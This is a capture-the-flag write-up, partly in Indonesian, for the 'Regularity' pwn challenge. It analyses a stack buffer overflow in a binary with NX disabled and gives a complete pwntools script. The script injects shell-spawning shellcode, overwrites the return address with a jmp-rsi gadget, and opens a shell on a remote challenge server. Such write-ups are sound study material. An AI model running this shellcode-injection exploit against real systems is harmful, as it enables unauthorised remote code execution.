# Regularity

### CATEGORY 
PWN / Binary Exploitation.

### DESCRIPTION
> Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now. We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing. It's not the most talkative, though, but it's the highest level of tech most of us will ever see...

### Files
1. regularity - regularity: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
2. flag.txt - flag palsu untuk testing di lokal.

### Analysis
** Binary Security **
![checksec]('./img/checksec.png')

** Key explanation **
- No canary found - rentan buffer overflow
- NX disabled - Shellcode dapat dieksekusi
- No pie - Position address selalu tetap tidak berubah ketika program dijalankan

** Disassembly **
![disassembly]('./img/disassembly.png')
Diawal saya menganalisa terlalu cepat sehingga saya terjebak dalam perhitungan offset yang kurang tepat, hal itu dipengaruhi
karena saya kurang eksplorasi pada fungsi read dimana sub menyimpan nilai 0x100 = 256 dari $rsp, namun
program membaca hingga 0x110 = 272 dari $edx, hal ini bisa memicu overflow. Namun tidak perlu sampai 272 bytes
sudah bisa untuk mendapatkan shell ketika payload mencapai 256 bytes. Dengan memanfaatkan jmp $rsi untuk lompat ke $rsp didalam fungsi read 
untuk membuka shell.

### EXPLOITATION

```python
from pwn import *

exe = ELF('./regularity')
context.binary = exe
context.log_level = 'debug'

# Testing lokal
# io = process('./regularity')

# Remote exploit
HOST = '154.57.164.71'
PORT = 44605
io = remote(HOST, PORT)

rsi_addr = 0x0000000000401041
offset = 256

shellcode = asm(shellcraft.sh())

shellcode_len = len(shellcode)

payload = shellcode + b"A" * (offset - shellcode_len) + p64(rsi_addr)
io.recvuntil(b'days?')
io.send(payload)

# Wait for shell
sleep(0.5)

# Start interactive shell
io.interactive()

```

Ketika program mengeksekusi shell
![flag]
